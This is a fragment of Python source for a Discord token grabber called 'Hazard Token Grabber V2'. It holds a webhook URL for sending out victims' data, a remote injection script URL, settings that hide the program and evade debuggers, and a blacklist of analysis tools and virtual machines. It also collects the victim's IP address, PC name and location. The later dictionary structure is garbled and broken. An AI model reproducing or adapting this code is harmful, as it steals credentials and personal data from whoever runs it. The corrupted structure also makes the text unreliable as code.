...
config = {'webhook': 'https://discord.com/api/webhooks/986327122903719996/Y7ZI9kMQLL0WIElv1QiQbO7DDr_BpRmPsTiBoNtWg9jLK7APAlHxnukQ_VYCxij7weX7', 'injection_url': 'https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js', 'kill_processes': False, 'startup': False, 'hide_self': True, 'anti_debug': True, 'blackListedPrograms': ['httpdebuggerui', 'wireshark', 'fiddler', 'regedit', 'cmd', 'taskmgr', 'vboxservice', 'df5serv', 'processhacker', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver']}
Victim = os.getlogin()
...
class Hazard_Token_Grabber_V2(functions):
    ...
    def finish(self):
        ...
        Victim_pc = {'Victim_pc': {'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif': {'value': {'name': f'*{Victim}* Just ran Hazard Token Grabber.V2', 'url': 'https://github.com/Rdimo/Hazard-Token-Grabber-V2', 'icon_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif'}, 'inline': 16119101, '```fix\n                                PCName: ': [{'name': f'[Google Maps Location]({googlemap})', 'value': f"​{'name': f'```fix\n                                IP:᠎ ', 'value': f"{ip.replace(' ', '᠎ ') if ip else 'N/A'}", 'inline': True}, {'name': '​', 'value': f"```fix\n                                PCName: {(' ' if org else '᠎ ')}", 'inline': False}, {'name': '​', 'value': f"{(' ' if org else '᠎ ')}", 'inline': False}], 'Victim_pc': {'
